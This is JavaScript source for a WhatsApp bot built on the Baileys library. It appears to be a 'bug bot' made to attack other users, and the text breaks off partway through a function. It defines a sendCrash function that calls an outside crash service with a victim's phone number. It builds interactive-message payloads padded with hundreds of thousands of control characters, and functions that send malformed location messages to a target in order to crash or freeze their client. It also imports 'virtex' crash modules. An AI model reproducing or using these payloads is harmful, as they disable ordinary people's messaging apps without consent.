require("./config")
const {
	smsg,
	getGroupAdmins,
	formatp,
	h2k,
	tanggal,
	formatDate,
	getTime,
	isUrl,
	sleep,
	clockString,
	msToDate,
	sort,
	toNumber,
	enumGetKey,
	runtime,
	fetchJson,
	getBuffer,
	jsonformat,
	delay,
	format,
	logic,
	generateProfilePicture,
	parseMention,
	getRandom,
	pickRandom,
	reSize
} = require("./system/lib/MyFunction")
//=================================================//
const {
	downloadContentFromMessage,
	emitGroupParticipantsUpdate,
	emitGroupUpdate,
	generateWAMessageContent,
	generateWAMessage,
	makeInMemoryStore,
	prepareWAMessageMedia,
	generateWAMessageFromContent,
	MediaType,
	areJidsSameUser,
	WAMessageStatus,
	downloadAndSaveMediaMessage,
	AuthenticationState,
	GroupMetadata,
	initInMemoryKeyStore,
	getContentType,
	MiscMessageGenerationOptions,
	useSingleFileAuthState,
	BufferJSON,
	WAMessageProto,
	MessageOptions,
	WAFlag,
	WANode,
	WAMetric,
	ChatModification,
	MessageTypeProto,
	WALocationMessage,
	ReconnectMode,
	WAContextInfo,
	proto,
	WAGroupMetadata,
	ProxyAgent,
	waChatKey,
	MimetypeMap,
	MediaPathMap,
	WAContactMessage,
	WAContactsArrayMessage,
	WAGroupInviteMessage,
	WATextMessage,
	WAMessageContent,
	WAMessage,
	BaileysError,
	WA_MESSAGE_STATUS_TYPE,
	MediaConnInfo,
	URL_REGEX,
	WAUrlInfo,
	WA_DEFAULT_EPHEMERAL,
	WAMediaUpload,
	mentionedJid,
	processTime,
	Browser,
	MessageType,
	Presence,
	WA_MESSAGE_STUB_TYPES,
	Mimetype,
	relayWAMessage,
	Browsers,
	GroupSettingChange,
	DisconnectReason,
	WASocket,
	getStream,
	WAProto,
	isBaileys,
	AnyMessageContent,
	fetchLatestBaileysVersion,
	templateMessage,
	InteractiveMessage,
	Header
} = require("@whiskeysockets/baileys")
//=================================================//
const {
	default: makeWaSocket,
	useMultiFileAuthState
} = require("@whiskeysockets/baileys")
//=================================================//
const axios = require("axios")
const os = require("os").cpus().length
const util = require("util")
const fetch = require("node-fetch")
const speed = require("performance-now")
const pino = require('pino')
const moment = require("moment-timezone")
const {
	spawn: spawn,
	exec
} = require("child_process")
const {
	performance
} = require("perf_hooks")
const fg = require("api-dylux")
const cheerio = require("cheerio")
const colors = require("@colors/colors/safe")
const chalk = require("chalk")
const FormData = require("form-data")
const ms = toMs = require("ms")
const crypto = require("crypto")
const tls = require("tls")
const net = require("net")
const http2 = require("http2")
const cluster = require("cluster")
const {
	color
} = require("./system/lib/color")
const {
	uptotelegra
} = require("./system/lib/upload")
const {
	remini
} = require("./system/lib/remini")
const {
	toPTT,
	toAudio
} = require("./system/lib/converter")
const {
	chatGpt,
	tiktokDl,
	ytMp4,
	ytMp3
} = require('./system/lib/screaper')
const {
	xvideosSearch,
	xvideosdl,
	xnxxdl,
	xnxxSearch
} = require('./system/lib/scraper3.js')
const {
	UploadFileUgu,
	webp2mp4File,
	floNime
} = require("./system/lib/uploader")
const {
	translate
} = require('@vitalets/google-translate-api')
const {
	youtube
} = require("btch-downloader")
const yts = require("yt-search")
const ytdl = require('@distube/ytdl-core')
const fakeUA = require("fake-useragent")
const randomUA = fakeUA().toString()
const fs = require("fs")
const {
	Creator,
	FileName
} = require("./ZnXCP/GetsuZo")
const {
	basename
} = require("path")
//=================================================//
const {
	addPremiumUser,
	getPremiumExpired,
	getPremiumPosition,
	expiredCheck,
	checkPremiumUser,
	getAllPremiumUser,
} = require("./system/lib/premiun")
//=================================================//
module.exports = async (VxoZap, m, chatUpdate, store) => {
	try {
		if (basename(__filename) !== FileName) return
		var body = (
			m.mtype === "conversation" ? m.message.conversation :
			m.mtype === "imageMessage" ? m.message.imageMessage.caption :
			m.mtype === "videoMessage" ? m.message.videoMessage.caption :
			m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
			m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
			m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
			m.mtype === "interactiveResponseMessage" ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id :
			m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
			m.mtype === "messageContextInfo" ?
			m.message.buttonsResponseMessage?.selectedButtonId ||
			m.message.listResponseMessage?.singleSelectReply.selectedRowId ||
			m.message.InteractiveResponseMessage.NativeFlowResponseMessage ||
			m.text :
			""
		);
		// STRING \\
		//=================================================//
		const DB = 'https://raw.githubusercontent.com/Jackxbec/Database/main/Security';
		// DATABASE \\
		//=================================================//
		async function isBotNumberRegistered(botNumber) {
			try {
				const response = await axios.get(DB);
				if (!Array.isArray(response.data)) {
					console.error('Data Yang Diterima Tidak Valid: Harus Berupa Array.');
					return false;
				}
				const registeredBotNumbers = response.data;
				return registeredBotNumbers.includes(botNumber);
			} catch (error) {
				console.error('Error Fetching Registered Bot Numbers:', error.message);
				return false;
			}
		}
		//=================================================//
		const {
			groupMembers
		} = m
		var budy = (typeof m.text == "string" ? m.text : "")
		const prefixRegex = /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/;
		const botNumber = await VxoZap.decodeJid(VxoZap.user.id)
		const isBotRegistered = await isBotNumberRegistered(botNumber);
		if (Object.keys(db.data.settings).includes(botNumber) && Object.keys(db.data.settings[botNumber]).includes("setPrefix") && db.data.settings[botNumber].setPrefix == "multi") {
			var thePrefix = "𝐌𝐔𝐋𝐓𝐈"
			var prefix = body.startsWith("#") ? "#" : body.startsWith("!") ? "!" : body.startsWith("/") ? "/" : body.startsWith("?") ? "?" : "."
			var isCmd = body.startsWith(prefix)
			var command = isCmd ? body.replace(prefix, "").trim().split(/ +/).shift().toLowerCase() : ""
		} else if (Object.keys(db.data.settings).includes(botNumber) && Object.keys(db.data.settings[botNumber]).includes("setPrefix") && db.data.settings[botNumber].setPrefix == "no") {
			var thePrefix = "𝐍𝐎"
			var prefix = ""
			var isCmd = body.startsWith(prefix)
			var command = body.replace(prefix, "").trim().split(/ +/).shift().toLowerCase()
		} else if (Object.keys(db.data.settings).includes(botNumber) && Object.keys(db.data.settings[botNumber]).includes("setPrefix") && db.data.settings[botNumber].setPrefix == "all") {
			var thePrefix = "𝐀𝐋𝐋"
			var prefix = body.startsWith("#") ? "#" : body.startsWith("!") ? "!" : body.startsWith("/") ? "/" : body.startsWith("?") ? "?" : "."
			var isCmd = body.startsWith(prefix)
			var command = body.replace(prefix, "").trim().split(/ +/).shift().toLowerCase()
		} else {
			var thePrefix = "𝐌𝐔𝐋𝐓𝐈"
			var prefix = body.startsWith("#") ? "#" : body.startsWith("!") ? "!" : body.startsWith("/") ? "/" : body.startsWith("?") ? "?" : "."
			var isCmd = body.startsWith(prefix)
			var command = isCmd ? body.replace(prefix, "").trim().split(/ +/).shift().toLowerCase() : ""
		}
		const content = JSON.stringify(m.message)
		const args = body.trim().split(/ +/).slice(1)
		const pushname = m.pushName || "No Name"
		const text = q = args.join(" ")
		const fatkuns = (m.quoted || m)
		const quoted = (fatkuns.mtype == "buttonsMessage") ? fatkuns[Object.keys(fatkuns)[1]] : (fatkuns.mtype == "templateMessage") ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : (fatkuns.mtype == "product") ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m
		const mime = (quoted.msg || quoted).mimetype || ""
		const qmsg = (quoted.msg || quoted)
		const isMedia = /image|video|sticker|audio/.test(mime)
		const input = m.isMention && m.quoted && m.mentionedJid.includes(m.quoted.sender) ? m.mentionedJid : m.isMention && m.quoted ? [...m.mentionedJid, m.quoted.sender] : m.isMention ? m.mentionedJid : m.quoted ? Array(m.quoted.sender) : text !== "" && (text.trim().includes("08") || text.trim().includes("+62") || text.trim().includes("628")) ? text.split("+62").filter((x) => (x !== "" && x.length >= 11 && !isNaN(parseInt(x.replace(new RegExp("[()+-/ +/]", "gi"), ""))))).map((x) => x.trim().startsWith("8") ? ("+62" + x.trim()) : x.trim()).join(" ").split(" ").filter((x) => (x.length >= 11 && !isNaN(parseInt(x.replace(new RegExp("[()+-/ +/]", "gi"), ""))))).map((x) => x.startsWith("08") ? parseInt(x.replace("08", "628")) : parseInt(x.replace(new RegExp("[()+-/ +/]", "gi"), ""))).map((x) => (x + "@s.whatsapp.net")) : text !== "" && !isNaN(parseInt(text.replace(new RegExp("[()+-/ +/]", "gi"), ""))) && util.format(parseInt(text.replace(new RegExp("[()+-/ +/]", "gi"), ""))).length >= 8 && util.format(parseInt(text.replace(new RegExp("[()+-/ +/]", "gi"), ""))).length <= 15 ? Array(parseInt(text.replace(new RegExp("[()+-/ +/]", "gi"), "")) + "@s.whatsapp.net") : []

		//User
		const numberQuery = text.replace(new RegExp("[()+-/ +/]", "gi"), "") + "@s.whatsapp.net"
		const mentionByTag = m.mtype == "extendedTextMessage" && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : []
		const mentionByReply = m.mtype == "extendedTextMessage" && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.participant || "" : ""
		const Inputo = mentionByTag[0] ? mentionByTag[0] : mentionByReply ? mentionByReply : q ? numberQuery : false
		const from = m.key.remoteJid
		const itsMe = m.sender == botNumber ? true : false
		const orgkaya = JSON.parse(fs.readFileSync("./database/premium.json"))
		const kontributor = JSON.parse(fs.readFileSync("./database/owner.json"))
		const contacts = JSON.parse(fs.readFileSync("./database/contacts.json"))
		const isContacts = contacts.includes(m.sender)
		const isCreator = [botNumber, ...kontributor, ...global.owner, Creator].map(v => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(m.sender)
		const isDeveloper = [botNumber, Creator].map(v => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(m.sender)
		const isPremium = isDeveloper || isCreator || checkPremiumUser(m.sender, orgkaya);

		// Group
		const groupMetadata = m.chat.endsWith("@g.us") ? (await VxoZap.groupMetadata(m.chat).catch(e => {})) : {}
		const groupName = Object.keys(groupMetadata).length > 0 ? groupMetadata.subject : ""
		const participants = Object.keys(groupMetadata).length > 0 ? groupMetadata.participants : ""
		const groupAdmins = Object.keys(groupMetadata).length > 0 ? (await getGroupAdmins(participants)) : ""
		const isBotAdmins = Object.keys(groupMetadata).length > 0 ? groupAdmins.includes(botNumber) : false
		const isAdmins = Object.keys(groupMetadata).length > 0 ? groupAdmins.includes(m.sender) : false
		const isGroup = m.chat.endsWith("@g.us")
		const groupOwner = Object.keys(groupMetadata).length > 0 ? groupMetadata.owner : ""
		const isGroupOwner = Object.keys(groupMetadata).length > 0 ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false

		//=================================================//
		const isText = ["extendedTextMessage", "conversation"].includes(m.mtype)
		const isImage = ["imageMessage"].includes(m.mtype)
		const isVideo = ["videoMessage"].includes(m.mtype)
		const isSticker = ["stickerMessage"].includes(m.mtype)
		const isAudio = ["audioMessage"].includes(m.mtype) && !(m.message[m.mtype]?.ptt)
		const isVoice = ["audioMessage"].includes(m.mtype) && !!(m.message[m.mtype]?.ptt)
		const isViewOnce = ["viewOnceMessageV2", "viewOnceMessage"].includes(m.mtype)
		const isContact = ["contactMessage", "contactsArrayMessage"].includes(m.mtype)
		const isLocation = ["locationMessage"].includes(m.mtype)
		const isDocument = ["documentMessage", "documentWithCaptionMessage"].includes(m.mtype)
		const isProtocol = ["protocolMessage"].includes(m.mtype)
		const isPollUpdate = ["pollUpdateMessage"].includes(m.mtype)
		const isPollCreation = ["pollCreationMessage"].includes(m.mtype)
		const isButtonList = ["interactiveResponseMessage"].includes(m.mtype)
		const isButtonReply = ["templateButtonReplyMessage"].includes(m.mtype)
		const isAllMedia = ["imageMessage", "videoMessage", "stickerMessage", "audioMessage", "viewOnceMessageV2", "viewOnceMessage", "contactMessage", "contactsArrayMessage", "locationMessage", "documentMessage", "documentWithCaptionMessage"].includes(m.mtype)
		const isQuotedViewOnce = m.mtype === "extendedTextMessage" && content.includes("viewOnceMessage")
		//=================================================//
		try {
			const isNumber = x => typeof x === "number" && !isNaN(x)
			const user = db.data.users[m.sender]
			if (typeof user !== "object") db.data.users[m.sender] = {}
			const chats = db.data.chats[m.chat]
			if (typeof chats !== "object") db.data.chats[m.chat] = {}
			if (user) {
				if (!user.premium) user.premiumTime = 0
				if (!("premium" in user)) user.premium = false
			} else db.data.users[m.sender] = {
				premiumTime: 0,
				name: m.name,
				premium: false
			}
			//=================================================//
			const setting = db.data.settings[botNumber]
			if (typeof setting !== "object") db.data.settings[botNumber] = {}
			if (setting) {
				if (!isNumber(setting.status)) setting.status = 0
				if (!("autobio" in setting)) setting.autobio = false
				if (!("autoread" in setting)) setting.autoread = false
				if (!("autoTyping" in setting)) setting.autoTyping = false
				if (!("autoRecord" in setting)) setting.autoRecord = true
				if (!("autoButton" in setting)) setting.autoButton = true
				if (!("public" in setting)) setting.public = false
				if (!("setPrefix" in setting)) setting.setPrefix = "multi" //multi, no, all
				if (!("onlygrub" in setting)) setting.onlygrub = false
			} else db.data.settings[botNumber] = {
				status: 0,
				stock: 10,
				autobio: false,
				autoTyping: false,
				autoRecord: true,
				autoButton: true,
				public: false,
				setPrefix: "all", //multi, no, all
				onlygrub: false,
				autoread: false,
				menuType: "buttonImage" //> buttonImage
			}

		} catch (err) {
			console.log(chalk.whiteBright("├"), chalk.keyword("red")("[ ERROR ]"), err)
		}
		// IMAGE \\
		//=================================================//
		const nulll = fs.readFileSync(`./system/image/nulll.jpg`)
		const nulll2 = fs.readFileSync(`./system/image/nulll2.jpg`)
		const TheZhiro = fs.readFileSync(`./system/image/TheZhiro.jpg`)
		const gsz = fs.readFileSync(`./system/image/gsz.jpg`)
		// IMAGE RESIZE \\
		const I1 = fs.readFileSync(`./system/image/300/300.jpg`)
		const I2 = fs.readFileSync(`./system/image/300/300x.jpg`)
		const I3 = fs.readFileSync(`./system/image/300/300x300.jpg`)
		const I4 = fs.readFileSync(`./system/image/300/300x300.png`)
		// ZAP IMG \\
		const GetsuZo = fs.readFileSync(`./system/image/IvS/EsQl.jpg`)
		const GetSuZo = fs.readFileSync(`./system/image/IvS/ViLoc.jpg`)
		//=================================================//
		// IMAGE URL \\		
		const images = [
		    "https://files.catbox.moe/8ehkk3.jpg",
		    "https://files.catbox.moe/2krxxm.jpg",
		    "https://files.catbox.moe/5u72ck.jpg",
		    "https://files.catbox.moe/apim8f.jpg",
		    "https://files.catbox.moe/phg56y.jpg",
			"https://telegra.ph/file/e6e5a3bbe152c54f6ac65.jpg",
			"https://telegra.ph/file/4063a5ab22fa48d09a428.jpg",
			"https://files.catbox.moe/cdoqzh.jpg",
			"https://files.catbox.moe/wgikom.jpg",
			"https://files.catbox.moe/u7rpip.jpg",
			"https://files.catbox.moe/0wdlj4.jpg",
			"https://files.catbox.moe/te894y.jpg",
			"https://files.catbox.moe/k7kb29.jpg",
			"https://files.catbox.moe/k7ym9h.jpg",
			"https://files.catbox.moe/8bvwtv.jpg",
			"https://files.catbox.moe/mgjvky.jpg",
			"https://files.catbox.moe/q46i9m.jpg",
			"https://files.catbox.moe/gd6eka.jpg",
			"https://files.catbox.moe/qpeyj5.jpg",
			"https://files.catbox.moe/jwsitc.jpg",
			"https://files.catbox.moe/sdhm35.jpg",
			"https://files.catbox.moe/zx805k.jpg",
			"https://files.catbox.moe/5qk12y.jpg",
			"https://files.catbox.moe/m62aqj.jpg",
			"https://files.catbox.moe/hagvan.jpg",
			"https://files.catbox.moe/ou1ghb.jpg",
			"https://files.catbox.moe/zrd8ey.jpg",
			"https://files.catbox.moe/h1okjg.jpg",
			"https://files.catbox.moe/bw7i7d.jpg"
		];

		function getRandomImage() {
			const randomIndex = Math.floor(Math.random() * images.length);
			return images[randomIndex];
		}
		const thumbSky = getRandomImage()
		const fakedoc = fs.readFileSync(`./src/doc.apk`)
		const fakejpg = fs.readFileSync(`./src/img.jpg`)
		//=================================================//
		//EMOJI\\
		//React Feature 
		const successreact = ['〽️']
		const finishmoji = successreact[Math.floor(Math.random() * successreact.length)]
		const taskdone = (teks) => {
			return VxoZap.sendMessage(m.chat, {
				react: {
					text: teks,
					key: m.key
				}
			})
		}

		// VIRTEX \\
		//=================================================//
		const {
			ios
		} = require("./virtex/ios.js")
		const {
			telapreta3
		} = require("./virtex/telapreta3.js")
		const {
			convite
		} = require("./virtex/convite.js")
		const {
			bugpdf
		} = require("./virtex/bugpdf.js")
		const {
			cP
		} = require('./virtex/bugUrl.js')
		const {
			ngazap
		} = require("./virtex/ngazap")
		const {
			notif3
		} = require("./virtex/notif3")
		const {
			notif4
		} = require("./virtex/notif4")
		//=================================================//
		// AUTO MODE \\
		//=================================================//
		if (!m.key.fromMe && db.data.settings[botNumber].autoread) {
			const readkey = {
				remoteJid: m.chat,
				id: m.key.id,
				participant: m.isGroup ? m.key.participant : undefined
			}
			await VxoZap.readMessages([readkey]);
		}
		VxoZap.sendPresenceUpdate("available", m.chat)
		if (db.data.settings[botNumber].autoTyping) {
			if (m.message) {
				VxoZap.sendPresenceUpdate("composing", m.chat)
			}
		}
		if (db.data.settings[botNumber].autoRecord) {
			if (m.message) {
				VxoZap.sendPresenceUpdate("recording", m.chat)
			}
		}
		if (db.data.settings[botNumber].autobio) {
			let setting = db.data.settings[botNumber]
			if (new Date() * 1 - setting.status > 1000) {
				let uptime = await runtime(process.uptime())
				await VxoZap.updateProfileStatus(`Client By : TheGetsuzoZhiro〽️ || Runtime : ${uptime}`)
				setting.status = new Date() * 1
			}
		}
		//=================================================//

		// CLOCK \\
		//=================================================//
		const moment = require("moment-timezone");
		const time = moment().tz("Asia/Jakarta").format("HH:mm:ss");
		let ucapanWaktu
		if (time >= "19:00:00" && time < "23:59:00") {
			ucapanWaktu = "Selamat Malam"
		} else if (time >= "15:00:00" && time < "19:00:00") {
			ucapanWaktu = "Selamat Sore"
		} else if (time >= "11:00:00" && time < "15:00:00") {
			ucapanWaktu = "Selamat Siang"
		} else if (time >= "06:00:00" && time < "11:00:00") {
			ucapanWaktu = "Selamat Pagi"
		} else {
			ucapanWaktu = "Selamat Subuh"
		}
		const wib = moment(Date.now()).tz("Asia/Jakarta").locale("id").format("HH:mm:ss z")
		const wita = moment(Date.now()).tz("Asia/Makassar").locale("id").format("HH:mm:ss z")
		const wit = moment(Date.now()).tz("Asia/Jayapura").locale("id").format("HH:mm:ss z")
		const salam = moment(Date.now()).tz("Asia/Jakarta").locale("id").format("a")
		let d = new Date
		let gmt = new Date(0).getTime() - new Date("1 Januari 2024").getTime()
		let weton = ["Pahing", "Pon", "Wage", "Kliwon", "Legi"][Math.floor(((d * 1) + gmt) / 84600000) % 5]
		let week = d.toLocaleDateString("id", {
			weekday: "long"
		})
		let calender = d.toLocaleDateString("id", {
			day: "numeric",
			month: "long",
			year: "numeric"
		})
		//=================================================//

		//Status
		if (!db.data.settings[botNumber].public && !isCreator) return

		//FUNCTION BUG\\
		//=================================================//
		// BY GETSUZO \\
		async function sendCrash(X) {
			try {
				const newcrash = await fetchJson('http://nxf-01.nexfuture.com.br:25579/sendCrash?numero=' + X);
				console.log(chalk.green("Send Bug By GetsuzoZhiro🐉"));
				console.log(chalk.red("InVisible⚡"));
			} catch (error) {
				console.error("Error Fetching Crash:", error);
			}
		}
		// HAX \\
		const Qrad = {
			key: {
				remoteJid: 'p',
				fromMe: false,
				participant: '0@s.whatsapp.net'
			},
			message: {
				"interactiveResponseMessage": {
					"body": {
						"text": "Sent",
						"format": "DEFAULT"
					},
					"nativeFlowResponseMessage": {
						"name": "galaxy_message",
						"paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"𝐑𝐚𝐝𝐢𝐭 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"@RaditX7\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"⭑̤⟅̊༑ ▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤${"\u0003".repeat(1045000)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
						"version": 3
					}
				}
			}
		}

		const EsQl = {
			key: {
				remoteJid: 'p',
				fromMe: false,
				participant: '0@s.whatsapp.net'
			},
			message: {
				"interactiveResponseMessage": {
					"body": {
						"text": "Sent",
						"format": "DEFAULT"
					},
					"nativeFlowResponseMessage": {
						"name": "galaxy_message",
						"paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"𝐑𝐚𝐝𝐢𝐭 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"RaditX7\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"⭑̤⟅̊༑ ▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤${"\u0003".repeat(350000)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
						"version": 3
					}
				}
			}
		}

		const VisiX = {
			key: {
				remoteJid: 'p',
				fromMe: false,
				participant: '0@s.whatsapp.net'
			},
			message: {
				"interactiveResponseMessage": {
					"body": {
						"text": "Sent",
						"format": "DEFAULT"
					},
					"nativeFlowResponseMessage": {
						"name": "galaxy_message",
						"paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"𝐑𝐚𝐝𝐢𝐭 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"@RaditX7\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"⭑̤⟅̊༑ ▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤${"\u0003".repeat(1020000)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
						"version": 3
					}
				}
			}
		}

		const VisiXLoc = {
			key: {
				remoteJid: 'p',
				fromMe: false,
				participant: '0@s.whatsapp.net'
			},
			message: {
				"interactiveResponseMessage": {
					"body": {
						"text": "Sent",
						"format": "DEFAULT"
					},
					"nativeFlowResponseMessage": {
						"name": "galaxy_message",
						"paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"𝐑𝐚𝐝𝐢𝐭 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"@RaditX7\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"⭑̤⟅̊༑ ▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤${"\u0003".repeat(777777)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
						"version": 3
					}
				}
			}
		}

		// ZNX INVASIONS \\
		async function InVisiLoc(X, ThM, ptcp = false) {
			let etc = generateWAMessageFromContent(X,
				proto.Message.fromObject({
					ephemeralMessage: {
						message: {
							interactiveMessage: {
								header: {
									title: "⭑̤⟅̊༑ ▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤‌‌‌‌‌‌‌‌‌‌‌‌‌‏",
									"locationMessage": {
										"degreesLatitude": -999.03499999999999,
										"degreesLongitude": 922.999999999999,
										"name": "𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉",
										"address": "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉",
										"jpegThumbnail": ThM
									},
									hasMediaAttachment: true
								},
								body: {
									text: ""
								},
								nativeFlowMessage: {
									messageParamsJson: " 𝐌𝐲𝐬𝐭𝐞𝐫𝐢𝐨𝐮𝐬 𝐌𝐞𝐧 𝐈𝐧 𝐂𝐲𝐛𝐞𝐫𝐒𝐩𝐚𝐜𝐞♻️ ",
									buttons: [{
											name: "single_select",
											buttonParamsJson: {
												"title": "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉",
												"sections": [{
													"title": "𝐑𝐚𝐝𝐢𝐭 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ",
													"rows": []
												}]
											}
										},
										{
											name: "call_permission_request",
											buttonParamsJson: {}
										}
									],
								},
							}
						}
					}
				}), {
					userJid: X,
					quoted: EsQl
				}
			);
			await VxoZap.relayMessage(X, etc.message, ptcp ? {
				participant: {
					jid: X
				}
			} : {});
			console.log(chalk.green("Send Bug By GetsuzoZhiro🐉"));
		};

		async function InVisiLocNull(X, Qtd, ThM, ptcp = false) {
			let etc = generateWAMessageFromContent(X,
				proto.Message.fromObject({
					ephemeralMessage: {
						message: {
							interactiveMessage: {
								header: {
									title: "⭑̤⟅̊༑ ▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤‌‌‌‌‌‌‌‌‌‌‌‌‌‏" + "ꦾ".repeat(77777),
									"locationMessage": {
										"degreesLatitude": -999.03499999999999,
										"degreesLongitude": 922.999999999999,
										"name": "𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉",
										"address": "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉",
										"jpegThumbnail": ThM
									},
									hasMediaAttachment: true
								},
								body: {
									text: ""
								},
								nativeFlowMessage: {
									messageParamsJson: " 𝐌𝐲𝐬𝐭𝐞𝐫𝐢𝐨𝐮𝐬 𝐌𝐞𝐧 𝐈𝐧 𝐂𝐲𝐛𝐞𝐫𝐒𝐩𝐚𝐜𝐞♻️ ",
									buttons: [{
											name: "single_select",
											buttonParamsJson: {
												"title": "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉",
												"sections": [{
													"title": "𝐑𝐚𝐝𝐢𝐭 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ",
													"rows": []
												}]
											}
										},
										{
											name: "call_permission_request",
											buttonParamsJson: {}
										}
									],
								},
							}
						}
					}
				}), {
					userJid: X,
					quoted: Qtd
				}
			);
			await VxoZap.relayMessage(X, etc.message, ptcp ? {
				participant: {
					jid: X
				}
			} : {});
			console.log(chalk.green("Send Bug By GetsuzoZhiro🐉"));
		};

		async function InVisiLocXz(X, ThM, ptcp = false) {
			let etc = generateWAMessageFromContent(X,
				proto.Message.fromObject({
					ephemeralMessage: {
						message: {
							interactiveMessage: {
								header: {
									title: "⭑̤⟅̊༑ ▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤‌‌‌‌‌‌‌‌‌‌‌‌‌‏",
									"locationMessage": {
										"degreesLatitude": -999.03499999999999,
										"degreesLongitude": 922.999999999999,
										"name": "𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉",
										"address": "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉",
										"jpegThumbnail": ThM
									},
									hasMediaAttachment: true
								},
								body: {
									text: ""
								},
								nativeFlowMessage: {
									messageParamsJson: " 𝐌𝐲𝐬𝐭𝐞𝐫𝐢𝐨𝐮𝐬 𝐌𝐞𝐧 𝐈𝐧 𝐂𝐲𝐛𝐞𝐫𝐒𝐩𝐚𝐜𝐞♻️ ",
									buttons: [{
											name: "single_select",
											buttonParamsJson: {
												"title": "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉",
												"sections": [{
